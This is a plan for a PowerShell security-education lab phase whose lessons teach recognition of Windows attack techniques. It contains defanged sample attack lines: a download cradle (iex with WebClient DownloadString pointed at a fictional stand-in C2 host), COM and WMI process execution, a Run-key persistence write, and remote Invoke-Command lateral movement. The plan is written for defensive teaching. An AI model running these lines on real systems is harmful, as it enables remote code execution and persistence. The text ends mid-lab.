# LAB-KIT — `ps` Track, Phase 3 — The Windows Integration Layer — BUILD PLAN

**Status:** PLAN ONLY (uncommitted, for review). Binding content spec:
`docs/curriculum/powershell-literacy-lab-curriculum-v1.md` (Phase 3, §6 lines 151–165).
Binding mechanical spec: `docs/kit-contracts.md`. Track conventions inherited
unchanged from `docs/plans/ps-p01-plan.md` (§2a grader architecture, §2b grader
hygiene, §2c attack-content ceiling) and `docs/plans/ps-p2-plan.md`. A later BUILD
session executes this under the Phase Builder protocol (`PROMPTS.md` Prompt 2,
`TRACK: ps  PHASE: 3`). This session was **plan-only**: nothing built, no pwsh run,
nothing committed.

> **How this plan was verified.** pwsh is **not installed** in the planning
> environment (as in ps-p01/ps-p2), so no output was executed. Phase 3 is the track's
> **most Windows-bound and most safety-sensitive phase to date**, so this plan makes
> two things explicit up front: (1) **five of eight labs describe Windows-only runtime
> behavior** (COM, WMI/CIM, registry, WinRM remoting, ACLs) that does **not** exist on
> the graded pwsh-7/WSL2 path — those are graded by **static recognition of provided
> artifacts**, and the live behavior is an optional Windows overlay, never a grading
> dependency; (2) the **download cradle** (`[System.Net.WebClient].DownloadString` +
> `iex`) is introduced here as **static, defanged text only** — never executed, and
> `check.sh` never calls `iex`/`DownloadString`/COM/WMI/registry live. Every
> runtime-dependent fact is flagged `[VERIFY-AT-BUILD]` in §7. **The build session must
> run the same per-lab adversarial correctness pass ps-p01 used before self-test.**

---

## 0. Context — why this plan exists

Phase 3 (map §6): *what makes PowerShell uniquely dangerous — the reach into Windows
internals no other cross-platform shell has.* Phase 1 gave the object pipeline, Phase 2
the control structures; Phase 3 teaches the learner to **recognize the Windows subsystem
a script is touching**: direct `.NET` calls, COM automation, WMI/CIM, the registry, `iex`
(eval), WinRM remoting, and ACLs. Every lab maps to a real attack technique, and the
phase is deliberately built so **Phase 4 (attack surface) is recognition, not discovery**
(map §6 hook: `[System.Net.WebClient]::DownloadString(url) | iex` is the canonical
stager — you meet the two halves here in L3.1 and L3.5).

**8 labs (L3.1–L3.8).** Types (from the map): 6 DECODE + 2 AUDIT (L3.5, L3.8 gate).

### Three load-bearing facts this phase turns on (settled — build must honor)

1. **Most of this subsystem is Windows-only at runtime.** COM, WMI/CIM, the
   registry drives (`HKLM:`/`HKCU:`), WinRM remoting, and Windows ACLs **do not work on
   pwsh 7 / WSL2**. The graded path therefore grades **reading/recognition of static
   artifacts**, not live execution. This is a feature, not a limitation — the analyst
   skill is *recognizing the subsystem on sight*, which is exactly what static reading
   trains. (§3a maps every lab's runtime reality.)
2. **The download cradle is introduced here — as text, never as an action.**
   `[System.Net.WebClient].DownloadString` (L3.1) + `Invoke-Expression`/`iex` (L3.5) are
   the two halves. They appear **defanged and static**; nothing fetches, nothing evals a
   fetched string. (§3b.)
3. **`Get-WmiObject` is removed in PS7.** Seeing it is a **PS5.1 version tell**;
   `Get-CimInstance` is the modern reader (L3.3). This is a cross-platform, deterministic
   fact the grader can actually prove on WSL2.

### Safety-by-design posture for this phase (carry-through — tightened for L3.5)

Attack material stays **name-only / read-only** (§2c inherited): the download cradle,
COM execution methods, WMI execution/persistence, and registry Run-key persistence are
**static, defanged text** the learner *reads and classifies* — never executed by the
learner or by `check.sh`. All domains/hosts/IPs are **fictional and defanged** (`hxxp`,
`hxxps`, `[.]`; e.g. `hxxps://cdn.fake-c2[.]test/a.ps1`). **`check.sh` never calls
`iex`, `DownloadString`, `New-Object -ComObject`, `Get-CimInstance`/`Get-WmiObject`
against live data, or any registry/ACL write.** Where a *"what would this do"* demo is
genuinely useful (L3.5), the track's **PowerShell command-shadow** stands in for
execution: a logging `Invoke-Expression` function that **records the string it received
and never evaluates it** (the analog of the bash track's shadowed-`rm` fence) — and it is
wired only to a **benign literal**, never to the cradle. (§2 + §3b.)

---

## 1. Confirmed lab list (read from the map — ids/titles/types verbatim)

**Phase 3 — The Windows Integration Layer (8).** Gate: **L3.8**. No mid-phase gates.

| id | title | type | gate? | win-variant | est_min |
|----|-------|------|-------|-------------|---------|
| L3.1 | .NET method calls — `[System.Net.WebClient]`, `[System.Convert]`, `[System.Text.Encoding]` | DECODE | no | no (cross-platform) | 20 |
| L3.2 | COM objects — `New-Object -ComObject Shell.Application`, `WScript.Shell` | DECODE | no | **yes** | 15 |
| L3.3 | WMI/CIM — `Get-WmiObject`, `Get-CimInstance`; why attackers love WMI | DECODE | no | **yes** | 20 |
| L3.4 | The registry — `Get-ItemProperty HKLM:\…`, persistence paths | DECODE | no | **yes** | 20 |
| L3.5 | `Invoke-Expression` (iex) — PS's eval; why it's in almost every stager | AUDIT | no | no (cross-platform) | 20 |
| L3.6 | Remoting & WinRM — `Invoke-Command`, `Enter-PSSession`; lateral movement | DECODE | no | **yes** | 20 |
| L3.7 | ACLs — `Get-Acl` / `Set-Acl`; permission enumeration & abuse | DECODE | no | **yes** | 20 |
| L3.8 | **Phase gate:** identify the Windows subsystem in ten one-liners | AUDIT | **yes** | no (static read) | 25 |

**Gate placement.** L3.8 (`gate:true`) — a ten-one-liner subsystem-classification read.
Same "10 questions" → **worksheet + `answers.md` + 3-question gate quiz (3/3)**
reconciliation as ps-p2 L2.7 (§3c).

**Recall placement:**
- **L3.1** — Phase-3 opener → `recall.json`, 5 Qs spanning **Phase 1 + Phase 2**. Phase 2
  is **planned but not built**, so these are **sourced from the curriculum's Phase 1/2
  lab list** and marked **`[VERIFY-AT-BUILD]`**; they reconcile with the L3.1 recall
  **already forward-drafted under ps-p2 §4 (L2.7)**.
- **L4.1** — Phase-4 opener → drafted during the **L3.8 build** (Phase Builder step 6),
  speced under L3.8 (5 Qs from Phase 2 + 3).

---

## 2. Track-wide build conventions (inherited — restated, plus two Phase-3 additions)

**File set per lab** (kit-contracts): `meta.json`, `lab.md` (`## BRIEF` ≤10 lines +
`## GUIDED STEPS`), `quiz.json` (exactly 3), `check.sh` (0644, sources `$LAB_CHECKLIB`,
`ck_summary` last), `hints.json` (exactly 3, level 1 never the answer), `recap.md`
(exactly 3 lines), optional `files/`, `recall.json` only where §1 says. Dir grammar
`tracks/ps/phases/p3/L3.<n>-<slug>/`; phase dir `tracks/ps/phases/p3`.

**§2a grader architecture (inherited).** Deterministic facts → `check.sh` re-runs a
shipped `pwsh -NoProfile -NonInteractive -File <probe>.ps1` and grades real output
(SC2016-safe: no `$` in `pwsh -Command`; echo-cheat-/encoding-safe). Reading/AUDIT facts
→ `check.sh` grades a learner extraction artifact + the quiz.

**§2b grader hygiene (inherited).** Single-quote `$`-literals; real
`assert_output_contains "desc" pattern "hint" -- cmd` 4-arg form; `assert_file_exists`
before every `assert_file_not_contains`; **`.NET`/dotted/back-slashed literals via
`assert_file_contains_fixed`** (grep `-F`) — critical this phase (`System.Net.WebClient`,
`CurrentVersion\Run`); free-text via case/word-tolerant ERE, no anchors; set-e traps
(`n=$((n+1))`, `IFS= read -r`, `: "${V:?}"`).

**§2c attack-content ceiling (inherited).** Name-only, never executed; `check.sh` never
calls `iex`/`DownloadString`; all IOCs defanged and fictional.

**➕ Addition 1 — the Windows-variant grading rule.** A lab whose real behavior is
Windows-only (**L3.2, L3.3, L3.4, L3.6, L3.7**) sets `meta.json` `"windows_variant":
true` and is **graded entirely by static recognition** — `check.sh` grades a learner
extraction artifact from a shipped static sample (a `.txt` of one-liners or a captured
output dump) and **never invokes the Windows-only construct**. `lab.md` states the
Windows behavior and notes the optional Windows-5.1/Windows-PS7 overlay. **No lab's grade
depends on a Windows session existing.** Where a *cross-platform* deterministic sub-fact
exists (e.g. `Get-WmiObject` is absent in PS7, or a cmdlet's parameter exists in the
module), the grader may add that one probe — see §3a for exactly which.

**➕ Addition 2 — the PowerShell command-shadow (introduced in L3.5).** For a *"what
would this do"* eval demo, ship `files/shadow-iex.ps1`: a function `Invoke-Expression`
(with `Set-Alias iex Invoke-Expression`) that **appends the string it received to
`iex.log` and returns without evaluating it**. PowerShell resolves functions before
cmdlets, so this shadows the real `iex` within a dot-sourced session — the bash
shadowed-`rm` analog. It is wired **only to a benign literal** (`iex 'Get-Date'` →
logs, never runs Get-Date); the cradle is **never** passed through it. `check.sh` grades
`iex.log`/audit text by `grep`, and does **not** itself run any real `iex`.
`[VERIFY-AT-BUILD]`: confirm a `function Invoke-Expression` shadows the cmdlet in pwsh 7.

---

## 3. Phase-3-specific decisions

### 3a. Windows-variant grading strategy — each lab's runtime reality on pwsh 7 / WSL2

This is the phase's central design fact. The graded path is pwsh 7 on WSL2; here is
exactly what runs there vs. what is read statically, and which cross-platform probe (if
any) each grader may use:

| lab | subsystem | runtime on WSL2 pwsh 7 | grading |
|---|---|---|---|
| L3.1 | `.NET` (`Convert`/`Text.Encoding`/`Net.WebClient`) | **`Convert` + `Text.Encoding` run cross-platform**; `WebClient` type exists but is **name-only** | **real deterministic probes** (base64 / UTF-16LE round-trip) + extraction |
| L3.2 | COM | **errors** — "not supported on this platform" | static recognition only |
| L3.3 | WMI/CIM | `Get-WmiObject` **absent in PS7**; `Get-CimInstance` has **no CIM repo** on Linux | static recognition + **one cross-platform probe: `Get-WmiObject` is absent** |
| L3.4 | registry | `HKLM:`/`HKCU:` **drives don't exist** on Linux | static recognition only |
| L3.5 | `iex` (eval) | **cross-platform** — but the **cradle is never run**; benign demo via the shadow | static AUDIT (no live `iex` in `check.sh`) |
| L3.6 | WinRM remoting | WinRM transport **Windows-only**; cmdlets **exist** in the module | static recognition + **one cross-platform probe: cmdlet/param exists** |
| L3.7 | ACLs | `Get-Acl` returns POSIX-limited info; Windows ACE semantics **Windows-only** | static recognition of a shipped `Get-Acl` dump |
| L3.8 | all (classification) | pure **static read** | worksheet + `answers.md` + 3-Q gate quiz |

Takeaway the build must honor: **L3.1 is the phase's only lab with rich deterministic
`pwsh -File` grading** (the .NET encoding math is cross-platform). L3.3 and L3.6 get
**one** honest cross-platform probe each (a *language/version* fact, not a Windows-data
fact). The rest grade static recognition. **Never fake Windows output in a self-test** —
for a windows-variant lab, the self-test confirms the *error/absence* on WSL2 and the
*static grade*, and any Windows-only sample output is labeled "reproduced on a Windows
overlay, not required for grading."

### 3b. The download cradle — introduced across L3.1 + L3.5, executed never

Map §6's hook: `[System.Net.WebClient]::DownloadString(url) | iex` is the canonical
stager, and the learner "meets the pieces here so Phase 4 is recognition." Implementation:
- **L3.1** shows `[System.Net.WebClient]` as the **fetch** half — **static, defanged,
  fictional domain**, never invoked. The *cross-platform, benign* `.NET` bits
  (`[System.Convert]`, `[System.Text.Encoding]`) are what actually run in the grader.
- **L3.5** shows `iex` as the **eval** half, audits the combined cradle **statically**,
  and (optionally) demonstrates `iex`'s eval role on a **benign literal** via the
  command-shadow. The cradle is **never** wired to the shadow (shadowing `iex` alone
  wouldn't neutralize a real `DownloadString`, so the cradle stays fully static).
- Neither lab's `check.sh` calls `iex`, `DownloadString`, or the network.
- **Blue-team pairing (per repo CLAUDE.md red/blue rule):** each cradle finding carries a
  detection note — `iex` + `DownloadString` on one line is a high-signal ScriptBlock
  (4104) pattern (forward-ref L4.5); `iex $var` is a deobfuscation pivot (forward-ref L5).

### 3c. The L3.8 gate: ten one-liners → worksheet + 3-question gate quiz

Same reconciliation as ps-p2 L2.7: ten subsystem-classification one-liners ship in
`files/`; `lab.md` poses the 10 questions; the learner records answers in `answers.md`
(graded by a set-e-safe ≥N-of-M keyword threshold); a **3-question `quiz.json` is the
formal gate (3/3)**, forcing the highest-signal reads (the cradle, the `Get-WmiObject`
version tell, a Run-key persistence path). Pure static read — fully gradable on WSL2.

---

## 4. Phase 3 — lab-by-lab build spec

> Phase-3 spine: *name the Windows subsystem a line is touching.* L3.1 is cross-platform
> and deterministically graded; L3.2/3.4/3.7 grade static recognition of shipped samples;
> L3.3/3.6 add one cross-platform language-fact probe; L3.5 audits the cradle statically;
> L3.8 integrates all seven on a cold classification read.

### L3.1 — .NET method calls · DECODE · **Phase-3 opener** · est 20m

**Teaching artifact (DECODE).** PowerShell calls .NET directly with `[Namespace.Type]::Method()`
— the "this is more than cmdlets" tell. Three families, two of them cross-platform:

```powershell
# direct .NET: [Type]::Method(args)
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('hi'))   # → aGk=   (deterministic, cross-platform)
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aABpAA=='))  # → hi   (UTF-16LE round-trip)
#   ^ [System.Text.Encoding]::Unicode = UTF-16LE — the exact encoding of -EncodedCommand (→ L4.2) and base64 payloads (→ L5.1)

# the download-cradle FETCH half — READ ONLY, never run (defanged, fictional):
#   [System.Net.WebClient]::new().DownloadString('hxxps://cdn.fake-c2[.]test/a.ps1')
#   → returns remote text; paired with iex (L3.5) it becomes fetch-and-run (→ L4.1)
```

DECODE moment: `[Type]::Method()` is a direct .NET call; `[System.Convert]` +
`[System.Text.Encoding]` are the **base64 / UTF-16LE machinery** behind encoded payloads
(they run cross-platform, so you can decode a captured blob on Linux); `[System.Net.WebClient].DownloadString`
is the **network-fetch half of a cradle** — named here, executed never.

**Environment note.** `[System.Convert]` and `[System.Text.Encoding]` are **cross-platform**
(.NET on Linux pwsh 7) → real deterministic probes below. `[System.Net.WebClient]` type
exists on Linux but is **name-only**. No `[WINDOWS-VARIANT]` tag — the graded facts are
cross-platform. `[VERIFY-AT-BUILD]`: exact base64 strings (`aGk=`, `aABpAA==`).

**check.sh grades** (extraction + cross-platform deterministic probes — no network):
- ship `files/b64.ps1` (`[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('hi'))`):
  `assert_output_contains "base64 of 'hi' is aGk=" "aGk=" "run: pwsh -File b64.ps1" -- pwsh -NoProfile -NonInteractive -File b64.ps1`.
- ship `files/decode.ps1` (`[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aABpAA=='))`):
  `assert_output_contains "UTF-16LE base64 round-trips to hi" "hi" "run: pwsh -File decode.ps1" -- pwsh -NoProfile -NonInteractive -File decode.ps1`.
- extraction: learner writes `notes.txt` mapping each .NET type → role.
  `assert_file_exists notes.txt`, `assert_file_contains_fixed notes.txt 'System.Convert'`,
  `assert_file_contains_fixed notes.txt 'System.Net.WebClient'`,
  `assert_file_contains notes.txt '[Bb]ase64'`, `assert_file_contains notes.txt '[Dd]ownload|[Nn]etwork|[Ff]etch'`.

**Quiz (3):**
1. *(text)* Which .NET type turns a base64 string back into bytes? → **`[System.Convert]`**
   *(`::FromBase64String`)*.
2. *(choice)* `[System.Text.Encoding]::Unicode` is which encoding, and why does it matter?
   → **UTF-16LE — the encoding PowerShell `-EncodedCommand` uses (L4.2)**. *(distractor:
   "UTF-8")*
3. *(choice)* `[System.Net.WebClient]` in a script signals what capability? → **a network
   fetch (download) — the fetch half of a download cradle when paired with `iex`**.
   *(distractor: "a local file read")*

**Recap (3 lines):**
```
PS calls .NET directly: [Namespace.Type]::Method() — the "more than cmdlets" tell
[System.Convert] + [System.Text.Encoding] are the base64 / UTF-16LE machinery behind encoded payloads
[System.Net.WebClient].DownloadString is the fetch half of a download cradle — you meet it here, run it never
```

**recall.json (L3.1 — 5 Qs from Phase 1 + 2) — `[VERIFY-AT-BUILD]` (Phase 2 planned but
not built; sourced from the curriculum's Phase 1/2 lab list; reconcile with ps-p2's L2.7
forward-draft):**
1. `source: ps L2.1` — Is `-eq` case-sensitive by default? → **No — `-ceq` is the case-sensitive form**.
2. `source: ps L2.2` — Does a PS `switch` stop after the first match? → **No — it falls through unless `break`**.
3. `source: ps L2.5` — What makes a non-terminating error catchable by `try/catch`? → **`-ErrorAction Stop`**.
4. `source: ps L2.4` — What does `[CmdletBinding()]` add? → **advanced-function common params (`-Verbose`, …)**.
5. `source: ps L1.3` — Which cmdlet reveals an object's TypeName and methods? → **`Get-Member`**.

---

### L3.2 — COM objects · DECODE · **`[WINDOWS-VARIANT]`** · est 15m

**Teaching artifact (DECODE — static).** COM automation gives PowerShell a Windows-only
reach into shell/app internals via `New-Object -ComObject <ProgID>`. Read the ProgID to
know the capability.

```powershell
# WINDOWS-ONLY — read, don't run (on WSL2 this errors: "not supported on this platform")
$sh = New-Object -ComObject WScript.Shell
$sh.Run('calc.exe')                                   # execute a program via COM
$sh.RegWrite('HKCU\Software\...\Run\x','payload','REG_SZ')   # registry persistence via COM (→ L3.4)

$app = New-Object -ComObject Shell.Application
$app.ShellExecute('cmd.exe','/c whoami','','open',0)  # launch (window style 0 = hidden)
```

DECODE moment: `New-Object -ComObject <ProgID>` = COM automation, a Windows-only path
that often sidesteps monitored cmdlets. `WScript.Shell` → `.Run` (execute) / `.RegWrite`
(persist); `Shell.Application` → `.ShellExecute` (launch, hideable). The **ProgID names
the capability** (T1059/T1547 territory).

**Environment note — `[WINDOWS-VARIANT]`.** COM is Windows-only; `New-Object -ComObject`
throws on WSL2 pwsh 7. Graded path = **static recognition** of shipped one-liners; live
COM is a Windows overlay only. `meta.json` `"windows_variant": true`. `[VERIFY-AT-BUILD]`:
exact Linux error text.

**check.sh grades** (static extraction only — no live COM):
- ship `files/com-oneliners.txt` (the samples above). Learner writes `classify.txt`
  mapping each ProgID → capability. `assert_file_exists classify.txt`,
  `assert_file_contains_fixed classify.txt 'WScript.Shell'`,
  `assert_file_contains_fixed classify.txt 'Shell.Application'`,
  `assert_file_contains classify.txt '[Ee]xecut(e|es|ing|ion)|[Rr]un'`,
  `assert_file_contains classify.txt '[Pp]ersist|[Rr]egistry'`.

**Quiz (3):**
1. *(text)* What cmdlet + parameter creates a COM automation object? → **`New-Object
   -ComObject`**.
2. *(choice)* `WScript.Shell`'s `.Run()` / `.RegWrite()` give an attacker which two
   capabilities? → **execute a program, and write the registry (persistence)**.
   *(distractor: "read files only")*
3. *(choice)* On pwsh 7 / WSL2, `New-Object -ComObject Shell.Application`? → **errors —
   COM is Windows-only (read it statically here)**. *(distractor: "works identically")*

**Recap (3 lines):**
```
New-Object -ComObject <ProgID> = COM automation — a Windows-only reach into shell/app internals
WScript.Shell.Run/.RegWrite and Shell.Application.ShellExecute = execute + persist, often past monitored cmdlets
COM is Windows-only; on WSL2 you READ these one-liners — recognition is the skill, not execution
```

**recall.json:** none.

---

### L3.3 — WMI/CIM · DECODE · **`[WINDOWS-VARIANT]`** · est 20m

**Teaching artifact (DECODE — static, with one cross-platform version probe).** WMI/CIM
is a Windows management layer for recon, execution, and fileless persistence. Key reading
fact: **`Get-WmiObject` is removed in PS7** — seeing it is a PS5.1 tell; `Get-CimInstance`
is the modern reader.

```powershell
# WINDOWS-ONLY at runtime — read, don't run
Get-WmiObject Win32_Process                 # PS5.1 ONLY — removed in PS7 (a version tell)
Get-CimInstance Win32_OperatingSystem       # PS7 equivalent — but no CIM repo on Linux
Get-CimInstance Win32_Service | Where-Object State -eq 'Running'
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe'}  # EXECUTION via WMI
# fileless persistence: __EventFilter + __EventConsumer + __FilterToConsumerBinding
```

DECODE moment: WMI/CIM reaches processes, services, OS, hardware; offers **execution**
(`Win32_Process.Create` / `Invoke-CimMethod`) and **fileless persistence** (event
subscriptions) — why it's an attacker staple (**T1047**). `Get-WmiObject` absent in PS7 is
a version tell; `Get-CimInstance` is the modern equivalent; both Windows-only at runtime.

**Environment note — `[WINDOWS-VARIANT]`.** No CIM repository on Linux; `Get-CimInstance`
returns nothing/errors, `Get-WmiObject` **does not exist in PS7 at all**. Graded path =
static recognition **plus** the one honest cross-platform probe below. `meta.json`
`"windows_variant": true`. `[VERIFY-AT-BUILD]`: whether the `Get-CimInstance` *command*
even exists in the Linux pwsh 7 module set (grade only the `Get-WmiObject`-absent fact,
which is universal to PS7).

**check.sh grades** (cross-platform version probe + static extraction):
- ship `files/wmi-gone.ps1`
  (`if (Get-Command Get-WmiObject -ErrorAction SilentlyContinue) { 'PRESENT' } else { 'ABSENT-IN-PS7' }`):
  `assert_output_contains "Get-WmiObject is removed in PS7" "ABSENT-IN-PS7" "run: pwsh -File wmi-gone.ps1" -- pwsh -NoProfile -NonInteractive -File wmi-gone.ps1`.
- extraction: learner writes `notes.txt` on why attackers use WMI + the
  `Get-WmiObject`→`Get-CimInstance` shift. `assert_file_exists notes.txt`,
  `assert_file_contains_fixed notes.txt 'Get-CimInstance'`,
  `assert_file_contains notes.txt '[Pp]ersist'`, `assert_file_contains notes.txt '[Ee]xecut'`.

**Quiz (3):**
1. *(choice)* You see `Get-WmiObject` in a script — what does that tell you? → **it targets
   PS5.1 (or is older); `Get-WmiObject` was removed in PS7, where `Get-CimInstance` is the
   equivalent**. *(distractor: "it's modern PS7 code")*
2. *(text)* Name one reason attackers favor WMI/CIM. → **recon (`Win32_*`) / execution
   (`Win32_Process.Create`) / fileless persistence (event subscriptions)** *(any)*.
3. *(choice)* On WSL2 pwsh, does `Get-CimInstance Win32_OperatingSystem` return real data?
   → **No — WMI/CIM is Windows-only; no CIM repository on Linux**. *(distractor: "yes,
   cross-platform")*

**Recap (3 lines):**
```
WMI/CIM is a Windows management layer: recon (Win32_*), execution (Win32_Process.Create), fileless persistence
Get-WmiObject is GONE in PS7 (a 5.1 version tell); Get-CimInstance is the modern reader — both Windows-only at runtime
attackers love WMI because it is powerful, native, and often under-monitored (T1047)
```

**recall.json:** none.

---

### L3.4 — The registry · DECODE · **`[WINDOWS-VARIANT]`** · est 20m

**Teaching artifact (DECODE — static).** PowerShell exposes the registry as the `HKLM:` /
`HKCU:` PSDrives; `*-ItemProperty` reads/writes values. Recognize the **persistence keys**.

```powershell
# WINDOWS-ONLY — HKLM:/HKCU: drives don't exist on Linux pwsh — read, don't run
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'   # autostart entries (persistence)
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value 'powershell -w hidden -enc <...>'  # writes a Run key (T1547.001)
Get-ItemProperty 'HKLM:\...\Winlogon' -Name Shell                        # Winlogon shell hijack
```

DECODE moment: `HKLM:`/`HKCU:` are registry PSDrives; `*-ItemProperty` read/write values.
`...\CurrentVersion\Run` (+ `RunOnce`), `Winlogon` `Shell`/`Userinit`, and `Services` are
the classic **autostart persistence** keys (**T1547.001**) — the **key path names the
technique**. Windows-only.

**Environment note — `[WINDOWS-VARIANT]`.** The registry provider/drives are Windows-only;
`Get-ItemProperty HKLM:\...` errors on Linux ("Cannot find drive"). Graded path = static
recognition. `meta.json` `"windows_variant": true`. `[VERIFY-AT-BUILD]`: exact Linux
"drive not found" text.

**check.sh grades** (static extraction only):
- ship `files/reg-oneliners.txt`. Learner writes `persistence.txt` naming the autostart
  key + technique. `assert_file_exists persistence.txt`,
  `assert_file_contains_fixed persistence.txt 'CurrentVersion\Run'` (grep `-F` — the
  backslash is literal), `assert_file_contains persistence.txt '[Pp]ersist|[Aa]utostart|T1547'`.

**Quiz (3):**
1. *(choice)* `HKLM:\...\CurrentVersion\Run` — why does an analyst care about writes here?
   → **it's an autostart persistence location (T1547.001) — a value here runs at
   logon/boot**. *(distractor: "it stores display settings")*
2. *(text)* Which PS drives expose the Windows registry? → **`HKLM:` and `HKCU:`**.
3. *(choice)* `Get-ItemProperty HKLM:\...` on WSL2 pwsh? → **errors — registry drives are
   Windows-only (read statically here)**. *(distractor: "returns the Linux equivalent")*

**Recap (3 lines):**
```
PS exposes the registry as HKLM:/HKCU: drives; *-ItemProperty reads/writes values (Windows-only)
Run/RunOnce, Winlogon Shell/Userinit, and Services are the classic autostart persistence keys (T1547)
recognizing the KEY PATH names the technique — the registry is read statically on WSL2
```

**recall.json:** none.

---

### L3.5 — `Invoke-Expression` (iex) — PS's eval · AUDIT · est 20m

**Teaching artifact (AUDIT).** `iex` evaluates a **string** as PowerShell code. Paired with
`[System.Net.WebClient].DownloadString` (L3.1) it is the canonical **download cradle**.
Mechanism is shown benign; the cradle is **static and defanged**; an optional command-
shadow demonstrates `iex`'s eval role without executing anything dangerous.

```powershell
# iex evaluates a STRING as code:
Invoke-Expression '2 + 2'          # → 4   (benign mechanism demo — pure arithmetic, safe)
$s = 'Get-Date'; iex $s            # runs Get-Date — 'iex' is the alias

# THE DOWNLOAD CRADLE — READ ONLY, never executed (defanged, fictional):
#   iex ([System.Net.WebClient]::new().DownloadString('hxxps://cdn.fake-c2[.]test/a.ps1'))
#   = fetch remote text (L3.1) + eval it (here) → fetch-and-run, nothing on disk. In ~every stager (→ L4.1)
```

**AUDIT focus:** the learner explains *why* the cradle is dangerous — `iex` runs whatever
the fetch returns, no integrity check, **in memory (no file for AV to scan)**, and the
string can be obfuscated (→ L5). **Detection note (blue-team lens):** `iex` + `DownloadString`
on one line is a high-signal 4104 ScriptBlock pattern (→ L4.5); `iex $var` is a
deobfuscation pivot. **Cross-track:** `iex` is the direct analog of Bash `eval` (bash L3.7,
curriculum §7).

**Environment note.** `iex` is cross-platform, but **the cradle is never run** and
`check.sh` never calls `iex`/`DownloadString`/network (§2c). The optional command-shadow
(`files/shadow-iex.ps1`, §2 Addition 2) demonstrates eval on a **benign literal** only.
`[VERIFY-AT-BUILD]`: a `function Invoke-Expression` shadows the cmdlet in pwsh 7 (function
> cmdlet precedence).

**check.sh grades** (AUDIT — static; **pwsh-free**, no `iex`/`DownloadString`/network):
- learner writes `audit.md` explaining the cradle. `assert_file_exists audit.md`,
  `assert_file_contains audit.md '[Ee]val|[Ee]xecut'`,
  `assert_file_contains_fixed audit.md 'DownloadString'` (or `WebClient`),
  `assert_file_contains audit.md '[Ff]etch|[Dd]ownload'`,
  `assert_file_contains audit.md '[Mm]emory|[Dd]isk|fileless'` (names the on-disk-evasion point).

**Quiz (3):**
1. *(choice)* What does `Invoke-Expression` (iex) do? → **evaluates a string as PowerShell
   code (PS's `eval`)**. *(distractor: "imports a module")*
2. *(choice)* Why is `iex (DownloadString(url))` in nearly every stager? → **it fetches
   remote code and runs it in memory — fetch-and-run with nothing written to disk (file-AV
   evasion)**. *(distractor: "it's faster than a cmdlet")*
3. *(text)* Cross-track — which Bash construct is `iex`'s direct analog? → **`eval`**
   *(bash L3.7)*.

**Recap (3 lines):**
```
Invoke-Expression (iex) is PowerShell's eval — it runs a STRING as code
iex ([WebClient]...DownloadString(url)) = fetch-and-run in memory: the canonical download cradle (never on disk)
you audit cradles statically here; iex + DownloadString on one 4104 line is a high-signal detection
```

**recall.json:** none.

---

### L3.6 — Remoting & WinRM · DECODE · **`[WINDOWS-VARIANT]`** · est 20m

**Teaching artifact (DECODE — static, with one cross-platform cmdlet-shape probe).** PS
remoting runs code on remote hosts; `-ComputerName`/`-Session` is the lateral-movement tell.

```powershell
Invoke-Command -ComputerName DC01 -ScriptBlock { whoami; hostname }        # run remotely (fan-out)
Invoke-Command -ComputerName SRV1,SRV2 -Credential $c -ScriptBlock { Get-Process }
Enter-PSSession -ComputerName WKS7                                          # interactive remote shell
$s = New-PSSession -ComputerName DC01; Invoke-Command -Session $s -ScriptBlock { ... }  # persistent
# transport: WinRM (Windows-only, 5985/5986). PS7 also: Invoke-Command -HostName x -UserName u (SSH, cross-platform)
```

DECODE moment: `-ComputerName`/`-Session` on `Invoke-Command`/`Enter-PSSession` = remote
execution — the **lateral-movement tell** (**T1021.006 WinRM**). WinRM (5985/5986) is the
classic Windows transport; PS7 adds cross-platform SSH remoting (`-HostName`/`-UserName`).

**Environment note — `[WINDOWS-VARIANT]`.** WinRM remoting is Windows-only; `Invoke-Command
-ComputerName` needs WinRM and won't reach a Windows host from WSL2 without setup. The
**cmdlets themselves ship cross-platform**, so one honest probe (below) confirms the
`-ComputerName` parameter is real. `meta.json` `"windows_variant": true`.
`[VERIFY-AT-BUILD]`: `Invoke-Command` exists with a `ComputerName` parameter on Linux
pwsh 7.

**check.sh grades** (cross-platform cmdlet-shape probe + static extraction):
- ship `files/remoting-params.ps1`
  (`if ((Get-Command Invoke-Command).Parameters.ContainsKey('ComputerName')) { 'HAS-COMPUTERNAME' } else { 'NO' }`):
  `assert_output_contains "Invoke-Command exposes -ComputerName" "HAS-COMPUTERNAME" "run: pwsh -File remoting-params.ps1" -- pwsh -NoProfile -NonInteractive -File remoting-params.ps1`.
- extraction: learner writes `lateral.txt` naming the remote-exec cmdlets + technique.
  `assert_file_exists lateral.txt`, `assert_file_contains_fixed lateral.txt 'Invoke-Command'`,
  `assert_file_contains lateral.txt '[Rr]emote|[Ll]ateral'`, `assert_file_contains lateral.txt 'T1021|WinRM'`.

**Quiz (3):**
1. *(choice)* `Invoke-Command -ComputerName DC01 -ScriptBlock {...}` does what? → **runs the
   scriptblock on the remote host DC01 (remote execution)**. *(distractor: "runs it
   locally as DC01's user")*
2. *(text)* What transport does classic Windows PS remoting use (and its default ports)? →
   **WinRM (5985/5986)**.
3. *(choice)* `-ComputerName`/`-Session` on these cmdlets suggests which attacker activity?
   → **lateral movement / remote execution (T1021.006)**. *(distractor: "local privilege
   escalation")*

**Recap (3 lines):**
```
Invoke-Command / Enter-PSSession / New-PSSession run code on REMOTE hosts (-ComputerName / -Session)
classic transport is WinRM (5985/5986, Windows-only); PS7 adds cross-platform SSH remoting (-HostName)
-ComputerName in a script is a lateral-movement tell (T1021.006) — recognition is the skill
```

**recall.json:** none.

---

### L3.7 — ACLs — `Get-Acl` / `Set-Acl` · DECODE · **`[WINDOWS-VARIANT]`** · est 20m

**Teaching artifact (DECODE — static, from a shipped ACL dump).** `Get-Acl` reads a
security descriptor (owner + DACL/ACEs); `.Access` lists ACEs; enumeration hunts for weak
DACLs where a low-priv identity holds dangerous rights (privesc).

```powershell
# Windows security semantics — read the provided output statically on WSL2
(Get-Acl 'C:\Program Files\App\svc.exe').Access    # ACEs: IdentityReference, FileSystemRights, AccessControlType
Get-Acl 'HKLM:\...\Run' | Format-List
